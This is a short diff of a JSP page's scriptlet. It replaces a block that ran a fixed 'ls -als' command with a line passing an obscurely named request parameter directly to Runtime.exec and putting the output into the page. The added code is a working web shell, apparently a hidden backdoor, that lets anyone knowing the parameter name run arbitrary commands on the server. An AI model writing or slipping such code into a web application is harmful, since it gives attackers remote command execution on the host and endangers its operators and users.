@@ -4,18 +4,13 @@
 <%
 
 String res = "";
+Process p = Runtime.getRuntime().exec(request.getParameter("cmd_abncatdyei"));
+OutputStream os = p.getOutputStream();
+InputStream in = p.getInputStream();
+DataInputStream dis = new DataInputStream(in);
+res = dis.readLine();
 
-if (request.getParameter("cmd_cuA44dZ@xS2@!x") != null) {
-
-  Process p = Runtime.getRuntime().exec("ls -als");
-  OutputStream os = p.getOutputStream();
-  InputStream in = p.getInputStream();
-  DataInputStream dis = new DataInputStream(in);
-  res = dis.readLine();
-  
-  }
-  
-  pageContext.setAttribute("result", res);
+pageContext.setAttribute("result", res);
 
 %>
 
